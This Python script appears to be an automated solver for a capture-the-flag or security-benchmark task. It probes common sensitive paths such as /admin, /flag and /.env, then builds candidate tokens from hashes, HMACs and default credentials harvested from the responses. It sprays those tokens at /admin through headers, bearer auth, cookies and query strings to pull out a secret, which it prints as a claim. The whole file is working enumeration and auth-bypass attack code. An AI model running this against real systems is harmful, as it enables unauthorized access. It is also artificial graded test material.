import sys, json, base64, hashlib, hmac, re, time

def req(method, path, body=None, headers=None, body_hex=None):
    msg = {"http": {"method": method, "path": path}}
    if headers:
        msg["http"]["headers"] = headers
    if body is not None:
        msg["http"]["body"] = body
    if body_hex is not None:
        msg["http"]["body_hex"] = body_hex
    sys.stdout.write(json.dumps(msg) + "\n")
    sys.stdout.flush()
    while True:
        line = sys.stdin.readline()
        if not line:
            return None
        line = line.strip()
        if not line:
            continue
        try:
            return json.loads(line)
        except Exception:
            continue

def b64d(s):
    try:
        return base64.b64decode(s + "=" * (-len(s) % 4))
    except Exception:
        return b""

def txt_of(r):
    if r is None:
        return ""
    return b64d(r.get("body_b64", "")).decode("utf-8", "replace")

def show(tag, r):
    if r is None:
        print("INFO %s -> NO REPLY" % tag)
        return
    print("INFO %s [%s] %s :: %s" % (tag, r.get("status"), r.get("content_type"), txt_of(r)[:1500]))

PATHS = ["/", "/admin", "/admin/", "/api/admin", "/flag", "/admin/flag", "/admin/secret",
         "/secret", "/health", "/status", "/login", "/session", "/api/session", "/token",
         "/api/token", "/index.html", "/robots.txt", "/debug", "/api/debug", "/info",
         "/api/info", "/metrics", "/adminarea", "/dashboard", "/api/flag", "/api/secret",
         "/admin/index.html", "/.env", "/api/v1/admin"]

bodies = []
statuses = {}
for p in PATHS:
    r = req("GET", p)
    show("GET " + p, r)
    if r is not None:
        statuses[p] = r.get("status")
        bodies.append(txt_of(r))
    r2 = req("POST", p, body="")
    t2 = txt_of(r2)
    if r2 is not None and (r2.get("status") not in (404, 405) or t2):
        show("POST " + p, r2)
        bodies.append(t2)

blob = "\n".join(bodies)
print("INFO STATUSES " + json.dumps(statuses))

hexes = []
for m in re.findall(r"[0-9a-fA-F]{8,}", blob):
    if m not in hexes:
        hexes.append(m)
words = []
for m in re.findall(r"[A-Za-z0-9_\-]{4,64}", blob):
    if m not in words:
        words.append(m)
print("INFO HEXES " + json.dumps(hexes[:40]))

literals = ["admin", "session", "1", "0", "true", "guest", "test", "secret", "ADMIN",
            "user", "root", "none", "null", "admin:admin", "flag", "key"]

toks = []
def addtok(t):
    if t and t not in toks and len(t) < 300:
        toks.append(t)

for h in hexes:
    addtok(h)
    addtok(h.lower())
    addtok(hashlib.sha256(h.encode()).hexdigest())
    addtok(hashlib.sha256(h.encode()).hexdigest()[:32])
    addtok(hashlib.md5(h.encode()).hexdigest())
    addtok(hmac.new(h.encode(), b"admin", hashlib.sha256).hexdigest())
    addtok(hmac.new(b"admin", h.encode(), hashlib.sha256).hexdigest())
    addtok(hashlib.sha256(hashlib.sha256(h.encode()).hexdigest().encode()).hexdigest())
    addtok(h[::-1])
    try:
        addtok(hashlib.sha256(bytes.fromhex(h)).hexdigest())
    except Exception:
        pass

for w in literals:
    addtok(w)
    addtok(hashlib.sha256(w.encode()).hexdigest())
    addtok(hashlib.sha256(w.encode()).hexdigest()[:32])
    addtok(hashlib.md5(w.encode()).hexdigest())

for w in words[:60]:
    addtok(hashlib.sha256(w.encode()).hexdigest())
    addtok(w)

print("INFO TOKENS %d" % len(toks))

HDRS = ["X-Session", "X-Session-Token", "X-Token", "X-Admin-Token", "Session"]

def try_all(tok, base_status):
    found = None
    attempts = []
    for h in HDRS:
        attempts.append(("hdr " + h, {"method": "GET", "path": "/admin", "headers": {h: tok}}))
    attempts.append(("bearer", {"method": "GET", "path": "/admin", "headers": {"Authorization": "Bearer " + tok}}))
    attempts.append(("auth raw", {"method": "GET", "path": "/admin", "headers": {"Authorization": tok}}))
    for ck in ("session", "session_token", "token", "admin_token", "sid"):
        attempts.append(("cookie " + ck, {"method": "GET", "path": "/admin", "headers": {"Cookie": ck + "=" + tok}}))
    for q in ("token", "session", "key", "t", "auth"):
        attempts.append(("query " + q, {"method": "GET", "path": "/admin?" + q + "=" + tok}))
    for tag, m in attempts:
        r = req(m["method"], m["path"], headers=m.get("headers"))
        st = r.get("status") if r else None
        body = txt_of(r)
        if st == 200 and base_status != 200:
            print("INFO HIT %s tok=%s [%s] :: %s" % (tag, tok[:64], st, body[:1500]))
            m6 = re.findall(r"[0-9a-fA-F]{16,}", body)
            if m6:
                found = m6[0]
            return found
        if re.search(r"secret", body, re.I) and st and st < 400:
            print("INFO SECRETISH %s tok=%s [%s] :: %s" % (tag, tok[:64], st, body[:1500]))
            m6 = re.findall(r"[0-9a-fA-F]{16,}", body)
            if m6:
                found = m6[0]
            return found
    return None

base = statuses.get("/admin")
print("INFO BASE /admin status %s" % base)
secret = None
for tok in toks:
    secret = try_all(tok, base)
    if secret:
        break

if secret:
    s = secret.lower()
    s = re.sub(r"[^0-9a-f]", "", s)
    print("CLAIM:" + json.dumps({"secret_hex": s}))
else:
    print("INFO NO_SECRET_FOUND")